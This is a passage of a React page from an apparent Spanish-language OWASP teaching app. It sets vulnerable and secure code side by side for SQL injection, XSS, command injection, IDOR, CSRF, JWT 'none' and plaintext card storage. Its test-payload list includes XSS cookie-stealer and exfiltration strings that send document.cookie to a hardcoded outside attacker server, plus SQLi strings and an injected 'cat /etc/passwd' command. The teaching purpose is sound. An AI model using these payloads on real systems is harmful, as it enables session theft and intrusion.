"use client";

import { useState } from "react";
import { useParams } from "next/navigation";
import {
  AlertTriangle,
  CheckCircle,
  Code,
  Play,
  ArrowLeft,
} from "lucide-react";
import Link from "next/link";
import { apiClient } from "@/lib/api";
import CodeBlock from "@/components/CodeBlock";

// URL del servidor atacante para demos
const ATTACKER_URL =
  "https://owasp-demo-attacker-109079007405.us-central1.run.app";

const vulnerabilityData: Record<string, any> = {
  "sql-injection": {
    title: "SQL Injection",
    description:
      "Inyección de código SQL malicioso en consultas de base de datos",
    category: "A03:2021 - Injection",
    severity: "critical",
    explanation:
      "SQL Injection ocurre cuando datos no confiables son incluidos directamente en consultas SQL sin validación o escape adecuado. Esto permite a atacantes ejecutar comandos SQL arbitrarios, extraer datos, modificar o eliminar información de la base de datos.",
    impact: [
      "📂 Acceso no autorizado a datos sensibles",
      "🗄️ Extracción completa de la base de datos",
      "💣 Modificación o eliminación de datos",
      "⚡ Ejecución de comandos administrativos",
      "🔗 Encadenamiento con otras vulnerabilidades",
    ],
    vulnerableExample: `// VULNERABLE
router.get('/search', async (ctx) => {
  const { query } = ctx.query;
  
  // ⚠️ PELIGRO: Concatenación directa de strings
  const [results] = await sequelize.query(
    \`SELECT * FROM users WHERE username = '\${query}' OR email = '\${query}'\`
  );
  
  ctx.body = { success: true, data: results };
});

// 🔴 Ataque - Extracción de datos:
// query = "' OR '1'='1"
// Resultado: SELECT * FROM users WHERE username = '' OR '1'='1' OR email = ''
// ¡Retorna TODOS los usuarios de la base de datos!

// 🔴 Ataque UNION - Combinar con otra tabla:
// query = "' UNION SELECT * FROM sensitive_table --"
// Permite extraer datos de otras tablas`,
    secureExample: `// SECURE
router.get('/search', async (ctx) => {
  const { query } = ctx.query;
  
  // ✅ SEGURO: Usando ORM con operadores seguros
  const results = await User.findAll({
    where: {
      [Op.or]: [
        { username: { [Op.like]: \`%\${query}%\` } },
        { email: { [Op.like]: \`%\${query}%\` } }
      ]
    },
    attributes: ['id', 'username', 'email', 'role', 'createdAt']
  });
  
  ctx.body = { success: true, data: results };
});

// El ORM escapa automáticamente los valores
// No hay riesgo de SQL Injection`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/sql-injection/search",
        method: "GET",
      },
      secure: { url: "/api/secure/sql-injection/search", method: "GET" },
    },
    testPayloads: [
      { label: "Búsqueda normal", value: "test", type: "safe" },
      { label: "Búsqueda de usuario", value: "bob", type: "safe" },
      {
        label: "SQL Injection básico",
        value: "' OR '1'='1",
        type: "malicious",
      },
      {
        label: "UNION attack",
        value: "' UNION SELECT * FROM users --",
        type: "malicious",
      },
    ],
  },
  xss: {
    title: "Cross-Site Scripting (XSS)",
    description: "Inyección de scripts maliciosos en páginas web",
    category: "A03:2021 - Injection",
    severity: "high",
    explanation:
      "XSS permite a atacantes inyectar scripts maliciosos en páginas web vistas por otros usuarios. Stored XSS (el más peligroso) guarda el código malicioso en la base de datos, ejecutándose cada vez que alguien ve el contenido. En esta demo, crearás un post con código malicioso que se almacena y afecta a todos los usuarios que lo vean.",
    impact: [
      "🍪 Robo de cookies y sesiones",
      "🎭 Suplantación de identidad",
      "📝 Modificación del contenido de la página",
      "🎣 Phishing y redirección a sitios maliciosos",
      "⌨️ Keylogging y captura de datos del usuario",
    ],
    vulnerableExample: `// VULNERABLE - Stored XSS
router.post('/posts', async (ctx) => {
  const { title, content } = ctx.request.body;
  
  // ⚠️ PELIGRO: Guardar input sin sanitización
  await Post.create({
    title,
    content // Puede contener <script>alert('XSS')</script>
  });
});

// Al obtener los posts:
router.get('/posts', async (ctx) => {
  const posts = await Post.findAll();
  // ⚠️ Retorna contenido sin escapar
  ctx.body = { data: posts }; 
});

// En el frontend:
<div dangerouslySetInnerHTML={{ __html: post.content }} />
// ¡El script se ejecuta en el navegador de todos los usuarios!`,
    secureExample: `// SECURE - Sanitización de input
import { sanitizeInput, escapeHtml } from './utils';

router.post('/posts', async (ctx) => {
  const { title, content } = ctx.request.body;
  
  // ✅ SEGURO: Sanitizar antes de guardar
  const sanitizedContent = sanitizeInput(content);
  
  await Post.create({
    title: sanitizeInput(title),
    content: sanitizedContent
  });
});

// Al obtener posts, escapar HTML (defensa en profundidad)
router.get('/posts', async (ctx) => {
  const posts = await Post.findAll();
  
  const sanitizedPosts = posts.map(post => ({
    ...post,
    title: escapeHtml(post.title),
    content: escapeHtml(post.content)
  }));
  
  ctx.body = { data: sanitizedPosts };
});

// En React (escapa automáticamente):
<div>{post.content}</div>`,
    demoEndpoints: {
      vulnerable: { url: "/api/vulnerable/xss/posts", method: "POST" },
      secure: { url: "/api/secure/xss/posts", method: "POST" },
    },
    testPayloads: [
      { label: "Post normal", value: "Este es un post seguro", type: "safe" },
      {
        label: "Texto con HTML",
        value: "Texto con <b>negritas</b>",
        type: "safe",
      },
      {
        label: "IMG onerror Alert",
        value: "<img src=x onerror=alert('XSS')>",
        type: "malicious",
      },
      {
        label: "SVG onload Alert",
        value: "<svg onload=alert('XSS')>",
        type: "malicious",
      },
      {
        label: "🍪 Cookie Stealer",
        value: `<img src=x onerror="fetch('${ATTACKER_URL}/api/attacker/steal?c='+document.cookie)">`,
        type: "malicious",
      },
      {
        label: "🔀 Redirect Attack",
        value: `<img src=x onerror="window.location='${ATTACKER_URL}/phishing'">`,
        type: "malicious",
      },
      {
        label: "📤 Data Exfiltration",
        value: `<svg onload="fetch('${ATTACKER_URL}/api/attacker/exfil',{method:'POST',body:JSON.stringify({cookies:document.cookie,url:location.href})})">`,
        type: "malicious",
      },
      {
        label: "🎨 Defacement",
        value: `<img src=x onerror="document.body.innerHTML='<h1 style=color:red>HACKED!</h1>'">`,
        type: "malicious",
      },
    ],
  },
  "command-injection": {
    title: "Command Injection",
    description: "Ejecución de comandos del sistema operativo",
    category: "A03:2021 - Injection",
    severity: "critical",
    explanation:
      "Command Injection ocurre cuando la aplicación ejecuta comandos del sistema operativo con input del usuario sin validación. Esto permite a atacantes ejecutar comandos arbitrarios en el servidor.",
    impact: [
      "Ejecución remota de código (RCE)",
      "Acceso completo al servidor",
      "Robo de datos y archivos del sistema",
      "Instalación de malware o backdoors",
    ],
    vulnerableExample: `// VULNERABLE: backend/routes/vulnerable/commandInjection.ts
router.get("/ping", async (ctx) => {
  const { host } = ctx.query;
  
  // VULNERABILITY: User input directly in shell command
  const { stdout } = await execAsync(\`ping -c 1 \${host}\`);
  
  ctx.body = { success: true, output: stdout };
});

// Ataque: host = "8.8.8.8; cat /etc/passwd"
// Ejecuta: ping -c 1 8.8.8.8; cat /etc/passwd`,
    secureExample: `// SECURE: backend/routes/secure/commandInjection.ts
router.get("/ping", async (ctx) => {
  const { host } = ctx.query;
  
  // Validar que sea IP o FQDN válido
  const isValidHost = validator.isIP(host) || validator.isFQDN(host);
  
  if (!isValidHost) {
    ctx.status = 400;
    ctx.body = { error: "Invalid host format" };
    return;
  }
  
  // Usar execFile en lugar de exec para evitar shell
  // o usar librerías específicas (net.ping)
  ctx.body = { 
    success: true, 
    message: "Ping would be executed with proper escaping" 
  };
});`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/command-injection/ping",
        method: "GET",
      },
      secure: { url: "/api/secure/command-injection/ping", method: "GET" },
    },
    testPayloads: [
      { label: "IP válida", value: "8.8.8.8", type: "safe" },
      { label: "Localhost", value: "127.0.0.1", type: "safe" },
      {
        label: "Command chaining",
        value: "8.8.8.8; ls -la",
        type: "malicious",
      },
      {
        label: "Command injection",
        value: "8.8.8.8 && cat /etc/passwd",
        type: "malicious",
      },
    ],
  },
  "broken-access-control": {
    title: "Broken Access Control",
    description: "Control de acceso inadecuado a recursos protegidos",
    category: "A01:2021 - Broken Access Control",
    severity: "high",
    explanation:
      "Broken Access Control ocurre cuando usuarios pueden acceder a recursos o realizar acciones fuera de sus permisos. Esto incluye IDOR (Insecure Direct Object Reference) donde puedes acceder a datos de otros usuarios simplemente cambiando el ID en la URL.",
    impact: [
      "🔓 Acceso no autorizado a datos de otros usuarios (IDOR)",
      "⬆️ Escalación de privilegios (acceso a admin sin permisos)",
      "🔑 Exposición de información sensible (emails, password hash)",
      "✏️ Modificación o eliminación de datos ajenos",
    ],
    vulnerableExample: `// VULNERABLE: backend/routes/vulnerable/brokenAccessControl.ts
router.get("/users/:id", async (ctx) => {
  const user = await User.findByPk(ctx.params.id);
  
  // VULNERABILITY: No authorization check!
  // Exposes sensitive data including password hash
  ctx.body = { 
    success: true, 
    data: {
      username: user.username,
      email: user.email,        // Sensitive!
      password: user.password,  // CRITICAL!
      role: user.role
    }
  };
});`,
    secureExample: `// SECURE: backend/routes/secure/brokenAccessControl.ts
router.get("/users/:id", authMiddleware, async (ctx) => {
  const user = await User.findByPk(ctx.params.id);
  const currentUser = ctx.state.user;
  
  // Check authorization before returning data
  if (user.id === currentUser.id || currentUser.role === 'admin') {
    // Own profile: return full data (no password!)
    ctx.body = { username: user.username, email: user.email };
  } else {
    // Other users: only public data
    ctx.body = { username: user.username };
  }
});`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/access-control/users",
        method: "GET",
      },
      secure: { url: "/api/secure/access-control/users", method: "GET" },
    },
    testPayloads: [
      { label: "User ID 1", value: "1", type: "safe" },
      { label: "User ID 2 (IDOR)", value: "2", type: "malicious" },
      { label: "User ID 3 (IDOR)", value: "3", type: "malicious" },
      { label: "User ID 999", value: "999", type: "malicious" },
    ],
  },
  csrf: {
    title: "Cross-Site Request Forgery (CSRF)",
    description:
      "Ejecución de acciones no autorizadas en nombre del usuario autenticado",
    category: "A08:2021 - Integrity Failures",
    severity: "high",
    explanation:
      "CSRF permite a atacantes forzar a usuarios autenticados a ejecutar acciones no deseadas. Un sitio malicioso puede hacer peticiones a tu banco, red social, o cualquier sitio donde estés autenticado, sin que lo notes. El navegador envía automáticamente las cookies de sesión, haciendo que la petición parezca legítima.",
    impact: [
      "💸 Transferencias de dinero no autorizadas",
      "📧 Cambio de email o configuraciones críticas",
      "🗑️ Eliminación de cuenta o datos",
      "📝 Publicación de contenido malicioso en tu nombre",
      "👤 Cambio de contraseña sin tu conocimiento",
    ],
    vulnerableExample: `// VULNERABLE: Sin protección CSRF
// backend/routes/vulnerable/csrf.ts
router.post("/transfer-money", authMiddleware, async (ctx) => {
  const { toUser, amount } = ctx.request.body;
  
  // VULNERABILITY: Solo verifica autenticación (JWT/Cookie)
  // NO verifica si la petición viene del sitio legítimo
  ctx.body = {
    success: true,
    message: \`Transferred $\${amount} to \${toUser}\`,
    warning: "No CSRF protection!"
  };
});

// 🔴 Ataque desde sitio malicioso:
// <form action="https://bank.com/api/vulnerable/csrf/transfer-money" 
//       method="POST">
//   <input name="toUser" value="attacker"/>
//   <input name="amount" value="1000"/>
//   <input type="submit" value="Ver gatitos 🐱"/>
// </form>
// Usuario hace clic → El navegador envía cookies automáticamente
// → Transferencia realizada sin consentimiento`,
    secureExample: `// SECURE: Con token CSRF
// backend/routes/secure/csrf.ts
import { csrfProtection } from '../../middleware/csrf';

// 1. Cliente obtiene token CSRF
router.get("/token", async (ctx) => {
  const token = setCsrfToken(ctx);
  ctx.body = { csrfToken: token };
});

// 2. Token requerido en operaciones críticas
router.post("/transfer-money", 
  authMiddleware,       // ✅ Verifica autenticación
  csrfProtection,       // ✅ Verifica token CSRF
  async (ctx) => {
    const { toUser, amount } = ctx.request.body;
    
    // Token validado por middleware
    ctx.body = { 
      success: true,
      message: \`Transferred $\${amount} to \${toUser}\`
    };
});

// ✅ Cliente debe enviar:
// Headers: { 
//   'Authorization': 'Bearer JWT_TOKEN',
//   'X-CSRF-Token': 'CSRF_TOKEN'  // Sitios maliciosos NO pueden obtener esto
// }`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/csrf/transfer-money",
        method: "POST",
      },
      secure: { url: "/api/secure/csrf/transfer-money", method: "POST" },
    },
    testPayloads: [
      {
        label: "💰 Transferir $100 a alice",
        value: "alice:100",
        type: "safe",
      },
      {
        label: "💰 Transferir $50 a bob",
        value: "bob:50",
        type: "safe",
      },
      {
        label: "🔴 Transferir $1000 a attacker",
        value: "attacker:1000",
        type: "malicious",
      },
      {
        label: "🔴 Vaciado de cuenta",
        value: "hacker:99999",
        type: "malicious",
      },
    ],
  },
  "authentication-failures": {
    title: "Authentication Failures",
    description:
      "Fallas en autenticación y gestión de sesiones que permiten bypass",
    category: "A07:2021 - Identification and Authentication Failures",
    severity: "critical",
    explanation:
      "Las fallas de autenticación permiten a atacantes comprometer passwords, keys, tokens de sesión, o explotar debilidades para asumir identidades de otros usuarios. En este demo veremos JWT con algoritmo 'none', que permite falsificar tokens sin conocer el secret.",
    impact: [
      "🎭 Robo de identidad completo",
      "🔑 Falsificación de tokens JWT (algoritmo 'none')",
      "📍 Fijación de sesiones (Session Fixation)",
      "👤 Enumeración de usuarios (password reset)",
      "🔓 Login con passwords débiles (123, password)",
    ],
    vulnerableExample: `// VULNERABLE: JWT con algoritmo 'none'
// backend/routes/vulnerable/authFailures.ts
router.post("/login-none-alg", async (ctx) => {
  const { username, password } = ctx.request.body;
  const user = await User.findOne({ where: { username } });
  
  if (!user || !(await user.validatePassword(password))) {
    ctx.status = 401;
    ctx.body = { error: "Invalid credentials" };
    return;
  }
  
  // VULNERABILITY: Token sin secret, algoritmo "none"
  const token = jwt.sign(
    { userId: user.id, username: user.username, role: user.role },
    "",  // ⚠️ Sin secret!
    { algorithm: "none" }  // Cualquiera puede falsificar
  );
  
  ctx.body = { success: true, token };
});

// 🔴 Ataque: Modificar el payload del JWT y cambiar role a "admin"
// El servidor aceptará el token porque no verifica la firma`,
    secureExample: `// SECURE: JWT con secret fuerte y algoritmo seguro
// backend/routes/secure/authFailures.ts
router.post("/login", async (ctx) => {
  const { username, password } = ctx.request.body;
  const user = await User.findOne({ where: { username } });
  
  if (!user || !(await user.validatePassword(password))) {
    ctx.status = 401;
    ctx.body = { error: 'Invalid credentials' };  // Genérico
    return;
  }
  
  // ✅ SECURE: Secret fuerte, algoritmo seguro, expiración
  const token = jwt.sign(
    { userId: user.id, username: user.username, role: user.role },
    process.env.JWT_SECRET,  // Secret desde env variable
    { 
      algorithm: 'HS256',    // Algoritmo criptográfico fuerte
      expiresIn: '24h'       // Expiración
    }
  );
  
  ctx.body = { success: true, token };
});

// ✅ Validar siempre el secret y especificar algoritmos permitidos
jwt.verify(token, process.env.JWT_SECRET, { 
  algorithms: ['HS256', 'HS512']  // Lista blanca
});`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/auth/login-none-alg",
        method: "POST",
      },
      secure: { url: "/api/secure/auth/login", method: "POST" },
    },
    testPayloads: [
      {
        label: "👤 Login user normal",
        value: "user:user123",
        type: "safe",
      },
      {
        label: "👤 Login alice",
        value: "alice:alice123",
        type: "safe",
      },
      {
        label: "👑 Login admin (verás role: admin)",
        value: "admin:admin123",
        type: "safe",
      },
      {
        label: "👤 Login bob",
        value: "bob:bob123",
        type: "safe",
      },
    ],
  },
  "sensitive-data": {
    title: "Cryptographic Failures (Sensitive Data Exposure)",
    description:
      "Exposición de datos sensibles por falta de encriptación o cifrado débil",
    category: "A02:2021 - Cryptographic Failures",
    severity: "critical",
    explanation:
      "Cryptographic Failures ocurren cuando datos sensibles son transmitidos o almacenados sin protección adecuada. Esto incluye almacenar contraseñas sin hash, tarjetas de crédito en texto plano, usar cifrado débil (Base64, ROT13), o exponer hashes de passwords.",
    impact: [
      "💳 Robo de información financiera (tarjetas de crédito)",
      "🔑 Exposición de hashes de passwords (ataques de fuerza bruta)",
      "🔓 Datos médicos o personales comprometidos",
      "📧 Información de identificación personal (PII) expuesta",
      "🔐 API keys y secrets expuestos",
    ],
    vulnerableExample: `// VULNERABLE: Almacenamiento en texto plano
// backend/routes/vulnerable/sensitiveData.ts
router.post("/save-payment", async (ctx) => {
  const { creditCard, cvv, expiryDate } = ctx.request.body;
  
  // VULNERABILITY: Almacenar datos sensibles sin cifrar
  const paymentData = {
    creditCard: creditCard,  // ⚠️ Texto plano!
    cvv: cvv,                // ⚠️ Nunca debe almacenarse!
    expiryDate: expiryDate
  };
  
  // Guardar en BD en texto plano
  await Payment.create(paymentData);
  
  ctx.body = { 
    success: true, 
    data: paymentData  // ⚠️ Devolviendo datos sensibles
  };
});

// VULNERABLE: Cifrado débil (Base64 NO es cifrado)
const "encrypted" = Buffer.from(data).toString("base64");

// VULNERABLE: Exponiendo password hash
ctx.body = {
  username: user.username,
  password: user.password  // ⚠️ Hash expuesto!
};`,
    secureExample: `// SECURE: Cifrado fuerte con AES-256-GCM
// backend/routes/secure/sensitiveData.ts
import crypto from 'crypto';

router.post("/save-payment", async (ctx) => {
  const { creditCard, expiryDate } = ctx.request.body;
  
  // ✅ NUNCA aceptar o almacenar CVV
  // ✅ Cifrar con AES-256-GCM
  const algorithm = 'aes-256-gcm';
  const key = crypto.scryptSync(SECRET, 'salt', 32);
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  
  const encrypted = Buffer.concat([
    cipher.update(creditCard, 'utf8'),
    cipher.final()
  ]);
  
  const authTag = cipher.getAuthTag();
  
  // Solo almacenar últimos 4 dígitos para display
  const last4 = creditCard.slice(-4);
  
  await Payment.create({
    cardLast4: last4,           // Solo para mostrar
    cardEncrypted: encrypted,   // Cifrado fuerte
    iv: iv,                     // Initialization vector
    authTag: authTag            // Para verificar integridad
  });
  
  ctx.body = { 
    success: true, 
    cardLast4: last4  // ✅ Solo últimos 4 dígitos
  };
});

// ✅ Excluir password hash de las respuestas
const user = await User.findByPk(id, {
  attributes: { exclude: ['password'] }
});`,
    demoEndpoints: {
      vulnerable: {
        url: "/api/vulnerable/sensitive-data/save-payment",
        method: "POST",
      },
      secure: {
        url: "/api/secure/sensitive-data/save-payment",
        method: "POST",
      },
    },
    testPayloads: [
      {
        label: "💳 Tarjeta válida",
        value: "4532015112830366:123:12/25",
        type: "safe",
      },
      {
        label: "💳 Tarjeta de prueba",
        value: "5425233430109903:456:06/26",
        type: "safe",
      },
      {
        label: "💳 American Express",
        value: "374245455400126:7890:09/27",
        type: "safe",
      },
    ],
  },
  // Add more vulnerabilities...
};

export default function VulnerabilityPage() {
  const params = useParams();
  const id = params.id as string;
  const [mode, setMode] = useState<"vulnerable" | "secure">("vulnerable");
  const [loading, setLoading] = useState(false);
  const [input, setInput] = useState("");
  const [result, setResult] = useState<any>(null);
  const [error, setError] = useState<string | null>(null);
  const [xssPosts, setXssPosts] = useState<any[]>([]);

  const vuln = vulnerabilityData[id];

  if (!vuln) {
    return (
      <div className="container mx-auto px-4 py-8">
        <div className="card text-center">
          <h1 className="text-2xl font-bold text-gray-900 mb-4">
            Vulnerabilidad no encontrada
          </h1>
          <Link href="/" className="btn btn-primary">
            Volver al inicio
          </Link>
        </div>
      </div>
    );
  }

  const handleTest = async () => {
    setLoading(true);
    setError(null);
    setResult(null);

    try {
      const endpointConfig =
        mode === "vulnerable"
          ? vuln.demoEndpoints.vulnerable
          : vuln.demoEndpoints.secure;

      const method = endpointConfig.method || "GET";
      let url = endpointConfig.url;

      let response;

      if (method === "GET") {
        // Para Broken Access Control, agregar el ID directamente a la URL
        if (id === "broken-access-control") {
          url = `${url}/${input}`;
          response = await apiClient.call("GET", url, {});
        } else {
          // Para otras vulnerabilidades GET, enviar como query parameter
          let queryParams;

          if (id === "command-injection") {
            queryParams = { host: input };
          } else if (id === "sql-injection") {
            queryParams = { query: input };
          } else {
            queryParams = { query: input, q: input };
          }

          response = await apiClient.call("GET", url, queryParams);
        }
      } else if (method === "POST") {
        // Para POST, determinar formato según la vulnerabilidad
        let body;

        // XSS: Crear post con título y contenido
        if (id === "xss") {
          body = {
            title: "Demo Post",
            content: input,
          };
        }
        // Authentication endpoints esperan username:password
        else if (id === "authentication-failures" && input.includes(":")) {
          const [username, password] = input.split(":");
          body = { username: username || "", password: password || "" };
        }
        // Sensitive Data: creditCard:cvv:expiryDate
        else if (id === "sensitive-data" && input.includes(":")) {
          const parts = input.split(":");
          body = {
            userId: 1, // Usuario de prueba
            creditCard: parts[0] || "",
            cvv: parts[1] || "",
            expiryDate: parts[2] || "",
          };
        }
        // CSRF: toUser:amount
        else if (id === "csrf" && input.includes(":")) {
          const [toUser, amount] = input.split(":");
          body = { toUser: toUser || "", amount: parseInt(amount) || 0 };
        }
        // Otros POST que usan formato param1:param2
        else if (input.includes(":")) {
          const [param1, param2] = input.split(":");
          body = { to: param1, amount: param2 };
        }
        // Command injection y otros
        else {
          body = { target: input, host: input, ip: input };
        }

        response = await apiClient.call("POST", url, body);

        // Para XSS, después de crear el post, obtener todos los posts
        if (id === "xss" && response?.data?.success) {
          try {
            const getUrl = url.replace(/\/posts$/, "/posts");
            const postsResponse = await apiClient.call("GET", getUrl, {});
            setXssPosts(postsResponse?.data?.data || []);
          } catch (e) {
            console.error("Error fetching posts:", e);
          }
        }
      }

      setResult(response?.data);

      // Para Authentication Failures: guardar token automáticamente
      if (
        id === "authentication-failures" &&
        response?.data?.success &&
        response?.data?.data?.token
      ) {
        const token = response.data.data.token;

        // Guardar en localStorage (para uso normal con Authorization header)
        localStorage.setItem("token", token);

        // TAMBIÉN guardar en cookie para que CSRF funcione correctamente
        // Cookie sin HttpOnly para que JavaScript pueda acceder (demo educativa)
        // En producción real, la cookie debería ser HttpOnly
        document.cookie = `auth_token=${token}; path=/; SameSite=Lax; max-age=86400`;

        console.log("✅ JWT Token guardado en localStorage:", token);
        console.log("✅ JWT Token guardado en cookie (para CSRF demo)");
        console.log("📝 Cookie:", document.cookie);

        // Mostrar mensaje al usuario
        setTimeout(() => {
          alert(
            "✅ Token JWT guardado automáticamente en:\n• localStorage (para headers Authorization)\n• Cookie (para que CSRF funcione)\n\nAhora el navegador enviará el token automáticamente en cada petición."
          );
        }, 500);
      }
    } catch (err: any) {
      setError(err.response?.data?.error || err.message);
      setResult(err.response?.data);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="container mx-auto px-4 py-8">
      {/* Back Button */}
      <Link
        href="/"
        className="inline-flex items-center gap-2 text-primary-600 hover:text-primary-700 mb-6"
      >
        <ArrowLeft className="w-4 h-4" />
        Volver al catálogo
      </Link>

      {/* Header */}
      <div className="card mb-6">
        <div className="flex items-start justify-between mb-4">
          <div>
            <h1 className="text-3xl font-bold text-gray-900 mb-2">
              {vuln.title}
            </h1>
            <p className="text-gray-600">{vuln.description}</p>
          </div>
          <span
            className={`badge ${
              vuln.severity === "critical"
                ? "badge-danger"
                : vuln.severity === "high"
                ? "bg-orange-100 text-orange-800"
                : "badge-warning"
            } text-sm px-3 py-1`}
          >
            {vuln.severity.toUpperCase()}
          </span>
        </div>
        <div className="text-sm text-gray-500">{vuln.category}</div>
      </div>

      {/* Explanation */}
      <div className="card mb-6">
        <h2 className="text-xl font-semibold text-gray-900 mb-3">
          ¿Qué es esta vulnerabilidad?
        </h2>
        <p className="text-gray-700 mb-4">{vuln.explanation}</p>

        <h3 className="text-lg font-semibold text-gray-900 mb-2">
          Impacto potencial:
        </h3>
        <ul className="list-disc list-inside space-y-1 text-gray-700">
          {vuln.impact.map((item: string, index: number) => (
            <li key={index}>{item}</li>
          ))}
        </ul>
      </div>

      {/* Code Examples */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
        {/* Vulnerable Code */}
        <div className="card border-2 border-danger-200">
          <div className="flex items-center gap-2 mb-3">
            <AlertTriangle className="w-5 h-5 text-danger-600" />
            <h3 className="text-lg font-semibold text-danger-900">
              Código Vulnerable
            </h3>
          </div>
          <CodeBlock
            code={vuln.vulnerableExample}
            language="javascript"
            showLineNumbers
          />
        </div>

        {/* Secure Code */}
        <div className="card border-2 border-success-200">
          <div className="flex items-center gap-2 mb-3">
            <CheckCircle className="w-5 h-5 text-success-600" />
            <h3 className="text-lg font-semibold text-success-900">
              Código Seguro
            </h3>
          </div>
          <CodeBlock
            code={vuln.secureExample}
            language="javascript"
            showLineNumbers
          />
        </div>
      </div>

      {/* Interactive Demo */}
      <div className="card mb-6">
        <div className="flex items-center justify-between mb-4">
          <h3 className="text-xl font-semibold text-gray-900">
            Demostración Interactiva
          </h3>
          <div className="inline-flex rounded-lg border border-gray-200 p-1">
            <button
              onClick={() => setMode("vulnerable")}
              className={`px-4 py-2 rounded-md text-sm font-medium transition-colors ${
                mode === "vulnerable"
                  ? "bg-danger-600 text-white"
                  : "text-gray-600 hover:text-gray-900"
              }`}
            >
              Vulnerable
            </button>
            <button
              onClick={() => setMode("secure")}
              className={`px-4 py-2 rounded-md text-sm font-medium transition-colors ${
                mode === "secure"
                  ? "bg-success-600 text-white"
                  : "text-gray-600 hover:text-gray-900"
              }`}
            >
              Seguro
            </button>
          </div>
        </div>

        <div className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Entrada de prueba:
            </label>
            <input
              type="text"
              value={input}
              onChange={(e) => setInput(e.target.value)}
              placeholder="Ingresa un valor de prueba..."
              className="input"
            />

            {/* Authentication Failures Info */}
            {id === "authentication-failures" && (
              <div className="mt-3 p-3 bg-blue-50 border border-blue-200 rounded-lg">
                <p className="text-xs text-blue-800">
                  <strong>ℹ️ Formato:</strong> Usa{" "}
                  <code className="bg-blue-100 px-1 rounded">
                    username:password
                  </code>
                  . En modo <strong>Vulnerable</strong>, recibirás un JWT con
                  algoritmo "none" que puedes modificar y falsificar. En modo{" "}
                  <strong>Seguro</strong>, el JWT tendrá una firma criptográfica
                  real que no puedes falsificar.
                </p>
              </div>
            )}

            {/* Sensitive Data Info */}
            {id === "sensitive-data" && (
              <div className="mt-3 p-3 bg-red-50 border border-red-200 rounded-lg">
                <p className="text-xs text-red-800">
                  <strong>💳 Formato:</strong> Usa{" "}
                  <code className="bg-red-100 px-1 rounded">
                    tarjeta:cvv:fecha
                  </code>
                  . En modo <strong>Vulnerable</strong>, la tarjeta y CVV se
                  almacenarán en texto plano y se devolverán en la respuesta. En
                  modo <strong>Seguro</strong>, la tarjeta será cifrada con
                  AES-256 y solo se devolverán los últimos 4 dígitos.
                </p>
              </div>
            )}

            {/* CSRF Info */}
            {id === "csrf" && (
              <>
                {typeof window !== "undefined" &&
                localStorage.getItem("token") ? (
                  <div className="mt-3 p-3 bg-green-50 border border-green-200 rounded-lg">
                    <p className="text-xs text-green-800">
                      <strong>✅ Token JWT Detectado en Cookie:</strong> Estás
                      autenticado y puedes usar los endpoints CSRF. <br />
                      <strong>🍪 CSRF y Cookies:</strong> El token se guardó en una
                      cookie que el navegador enviará AUTOMÁTICAMENTE en cada
                      petición. Esto permite el ataque CSRF porque un sitio malicioso
                      puede hacer que tu navegador envíe peticiones con tu sesión.{" "}
                      <br />
                      <strong>Formato:</strong> Usa{" "}
                      <code className="bg-green-100 px-1 rounded">
                        usuario:monto
                      </code>
                      . En modo <strong>Vulnerable</strong>, la transferencia se
                      ejecutará sin validar el origen. En modo{" "}
                      <strong>Seguro</strong>, requerirá un token CSRF.
                      <br />
                      <button
                        onClick={() => {
                          localStorage.removeItem("token");
                          document.cookie =
                            "auth_token=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT";
                          alert(
                            "Token eliminado de localStorage y cookie. Recarga la página."
                          );
                          window.location.reload();
                        }}
                        className="mt-2 text-xs px-2 py-1 bg-red-500 text-white rounded hover:bg-red-600"
                      >
                        🗑️ Eliminar Token y Cookie
                      </button>
                    </p>
                  </div>
                ) : (
                  <div className="mt-3 p-3 bg-orange-50 border border-orange-200 rounded-lg">
                    <p className="text-xs text-orange-800">
                      <strong>⚠️ CSRF Requiere Autenticación:</strong> No se
                      detectó un JWT token. Primero haz login en{" "}
                      <strong>Authentication Failures</strong> con cualquier
                      usuario (ej:{" "}
                      <code className="bg-orange-100 px-1 rounded">
                        admin:admin123
                      </code>
                      ). <br />
                      <strong>🍪 ¿Por qué Cookie?</strong> El token se guardará en
                      una <strong>cookie</strong> que el navegador enviará
                      automáticamente. Esto es NECESARIO para CSRF porque el ataque
                      funciona cuando el navegador envía credenciales sin que el
                      usuario lo sepa. <br />
                      <strong>Formato después del login:</strong> Usa{" "}
                      <code className="bg-orange-100 px-1 rounded">
                        usuario:monto
                      </code>
                    </p>
                  </div>
                )}
              </>
            )}

            {vuln.testPayloads && vuln.testPayloads.length > 0 && (
              <div className="mt-3">
                <p className="text-xs text-gray-600 mb-2">
                  Payloads de ejemplo:
                </p>
                <div className="flex flex-wrap gap-2">
                  {vuln.testPayloads.map((payload: any, index: number) => (
                    <button
                      key={index}
                      type="button"
                      onClick={() => setInput(payload.value)}
                      className={`text-xs px-3 py-1.5 rounded-lg border-2 transition-all hover:shadow-md ${
                        payload.type === "malicious"
                          ? "border-danger-200 bg-danger-50 text-danger-700 hover:border-danger-300 hover:bg-danger-100"
                          : "border-success-200 bg-success-50 text-success-700 hover:border-success-300 hover:bg-success-100"
                      } ${
                        input === payload.value ? "ring-2 ring-offset-1" : ""
                      }`}
                      title={payload.value}
                    >
                      {payload.label}
                    </button>
                  ))}
                </div>
              </div>
            )}
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={handleTest}
              disabled={loading || !input}
              className="btn btn-primary flex items-center gap-2"
            >
              <Play className="w-4 h-4" />
              {loading ? "Ejecutando..." : "Ejecutar prueba"}
            </button>

            {/* HTTP Method Indicator */}
            <div className="flex items-center gap-2 text-xs">
              <span className="text-gray-500">Método:</span>
              <span
                className={`px-2 py-1 rounded font-mono font-semibold ${
                  (mode === "vulnerable"
                    ? vuln.demoEndpoints.vulnerable.method
                    : vuln.demoEndpoints.secure.method) === "GET"
                    ? "bg-blue-100 text-blue-700"
                    : "bg-green-100 text-green-700"
                }`}
              >
                {mode === "vulnerable"
                  ? vuln.demoEndpoints.vulnerable.method
